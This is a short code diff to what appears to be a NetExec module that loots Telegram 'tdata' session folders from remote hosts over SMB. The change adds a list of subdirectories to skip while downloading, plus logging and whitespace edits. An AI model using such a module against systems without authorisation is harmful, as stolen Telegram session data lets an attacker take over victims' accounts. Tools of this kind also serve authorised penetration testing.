@@ -34,6 +34,7 @@ from impacket.smbconnection import SessionError
 
 from nxc.helpers.misc import CATEGORY
 
+
 EXCLUDE_SUBSTRINGS: Sequence[str] = [
     "Visual Studio",
     "Temp",
@@ -45,8 +46,18 @@ EXCLUDE_SUBSTRINGS: Sequence[str] = [
     "Mozilla",
 ]
 
+SKIP_TDATA_DIRS: Sequence[str] = [
+    "dumps",
+    "emoji",
+    "temp",
+    "user_data",
+]
+
+SKIP_TDATA_DIRS_LOWER = frozenset(d.lower() for d in SKIP_TDATA_DIRS)
+
 
 def _decode_share_name(raw: object) -> str:
+
     if isinstance(raw, bytes):
         raw_str = raw.decode("utf-8", errors="ignore")
     else:
@@ -163,6 +174,10 @@ def _download_tree(
     for entry in entries:
         name = entry.get_longname()
         if name in [".", ".."]:
+            continue
+
+        if entry.is_directory() and name.lower() in SKIP_TDATA_DIRS_LOWER:
+            logger.debug(f"[*] Skipping directory {share_name}:{remote_base}\\{name}")
             continue
 
         remote_child = f"{remote_base}\\{name}"
@@ -288,6 +303,5 @@ class NXCModule:
         except Exception as exc:  
             log.error(f"[!] Failed to write info file {info_path}: {exc}")
             return
-
 
         log.highlight(f"[+] Telegram tdata looted to {tdata_local_root}")
